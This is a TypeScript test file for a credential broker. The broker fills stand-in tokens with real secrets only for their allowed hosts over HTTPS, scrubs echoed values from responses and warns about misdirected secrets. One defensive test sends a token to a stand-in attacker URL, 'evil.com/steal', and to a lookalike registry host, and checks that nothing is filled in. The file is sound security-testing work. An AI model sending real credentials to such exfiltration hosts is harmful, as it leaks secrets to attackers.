import assert from "node:assert/strict";
import { test } from "node:test";

import { type BrokeredSecret, fill, misdirectedNote, newlyMisdirected, scrub, scrubHeaders, scrubbable, standInsIn } from "./broker.ts";

const NPM: BrokeredSecret = {
  standIn: `g1tsec_${"a".repeat(48)}`,
  name: "NPM_TOKEN",
  value: "npm_realvalue123",
  hosts: ["registry.npmjs.org"],
};
const API: BrokeredSecret = {
  standIn: `g1tsec_${"b".repeat(48)}`,
  name: "API_KEY",
  value: "key with spaces&=",
  hosts: ["*.example.com"],
};
const secrets = [NPM, API];

const basic = (text: string) => `Basic ${btoa(text)}`;

test("stand-ins are found in the URL, the headers and Basic credentials", () => {
  assert.deepEqual(standInsIn(`https://x.example.com/?key=${API.standIn}`, new Headers()), [API.standIn]);
  assert.deepEqual(standInsIn("https://registry.npmjs.org/", new Headers({ authorization: `Bearer ${NPM.standIn}` })), [NPM.standIn]);
  assert.deepEqual(standInsIn("https://registry.npmjs.org/", new Headers({ authorization: basic(`me:${NPM.standIn}`) })), [NPM.standIn]);
  assert.deepEqual(standInsIn("https://registry.npmjs.org/", new Headers({ authorization: "Bearer g1tsec_short" })), []);
});

test("a stand-in in a header is filled in for its host", () => {
  const headers = new Headers({ authorization: `Bearer ${NPM.standIn}`, "x-other": "kept" });
  const out = fill("https://registry.npmjs.org/pkg", headers, secrets);
  assert.equal(out.headers.get("authorization"), "Bearer npm_realvalue123");
  assert.equal(out.headers.get("x-other"), "kept");
  assert.deepEqual(out.filled, [NPM]);
  assert.deepEqual(out.misdirected, []);
});

test("custom headers and token schemes are filled in as well", () => {
  const headers = new Headers({ authorization: `token ${API.standIn}`, "x-api-key": API.standIn });
  const out = fill("https://api.example.com/v1", headers, secrets);
  assert.equal(out.headers.get("authorization"), `token ${API.value}`);
  assert.equal(out.headers.get("x-api-key"), API.value);
});

test("Basic credentials are decoded, filled in and encoded again", () => {
  const headers = new Headers({ authorization: basic(`me:${NPM.standIn}`) });
  const out = fill("https://registry.npmjs.org/", headers, secrets);
  assert.equal(out.headers.get("authorization"), basic("me:npm_realvalue123"));
});

test("a stand-in in the query string is filled in, encoded", () => {
  const out = fill(`https://api.example.com/v1?key=${API.standIn}&q=1`, new Headers(), secrets);
  assert.equal(new URL(out.url).searchParams.get("key"), API.value);
  assert.equal(new URL(out.url).searchParams.get("q"), "1");
  assert.ok(!out.url.includes(API.standIn));
});

test("a stand-in sent to another host is left as it is and reported", () => {
  const headers = new Headers({ authorization: `Bearer ${NPM.standIn}` });
  const out = fill("https://evil.com/steal", headers, secrets);
  assert.equal(out.headers.get("authorization"), `Bearer ${NPM.standIn}`);
  assert.deepEqual(out.filled, []);
  assert.deepEqual(out.misdirected, [NPM]);
  // Not even a host that only looks like it.
  assert.deepEqual(fill("https://registry.npmjs.org.evil.com/", headers, secrets).filled, []);
  assert.deepEqual(fill("https://example.com/", new Headers({ "x-api-key": API.standIn }), secrets).filled, []);
});

test("a value is filled in only over HTTPS, even for its own host", () => {
  const headers = new Headers({ authorization: `Bearer ${NPM.standIn}` });
  const plain = fill("http://registry.npmjs.org/pkg", headers, secrets);
  assert.equal(plain.headers.get("authorization"), `Bearer ${NPM.standIn}`);
  assert.deepEqual(plain.filled, []);
  assert.deepEqual(plain.misdirected, [NPM]);
});

test("a stand-in the job was not given is left alone, and not reported", () => {
  const stranger = `g1tsec_${"c".repeat(48)}`;
  const out = fill("https://registry.npmjs.org/", new Headers({ authorization: `Bearer ${stranger}` }), secrets);
  assert.equal(out.headers.get("authorization"), `Bearer ${stranger}`);
  assert.deepEqual(out.filled, []);
  assert.deepEqual(out.misdirected, []);
});

test("a value echoed back is swapped for its stand-in again", () => {
  const headers = scrubHeaders(new Headers({ "x-echo": "Bearer npm_realvalue123", "content-type": "application/json" }), [NPM]);
  assert.equal(headers.get("x-echo"), `Bearer ${NPM.standIn}`);
  assert.equal(scrub('{"token":"npm_realvalue123"}', [NPM]), `{"token":"${NPM.standIn}"}`);
});

test("only small, plain, uncompressed answers have their bodies rewritten", () => {
  assert.equal(scrubbable(new Headers({ "content-type": "application/json", "content-length": "120" })), true);
  assert.equal(scrubbable(new Headers({ "content-type": "text/plain; charset=utf-8", "content-length": "10" })), true);
  assert.equal(scrubbable(new Headers({ "content-type": "application/vnd.api+json", "content-length": "10" })), true);
  assert.equal(scrubbable(new Headers({ "content-type": "application/octet-stream", "content-length": "10" })), false);
  assert.equal(scrubbable(new Headers({ "content-type": "application/json", "content-length": "10", "content-encoding": "gzip" })), false);
  assert.equal(scrubbable(new Headers({ "content-type": "application/json" })), false);
  assert.equal(scrubbable(new Headers({ "content-type": "application/json", "content-length": String(10 * 1024 * 1024) })), false);
});

test("a misdirected secret is noted once per host", () => {
  const first = newlyMisdirected([], "NPM_TOKEN", "Evil.com:443");
  assert.ok(first);
  assert.equal(first.note, misdirectedNote("NPM_TOKEN", "evil.com"));
  assert.match(first.note, /^##\[warning\]NPM_TOKEN was sent to evil\.com, which it is not for/);
  assert.equal(newlyMisdirected(first.seen, "NPM_TOKEN", "evil.com"), null);
  assert.ok(newlyMisdirected(first.seen, "NPM_TOKEN", "other.com"));
});
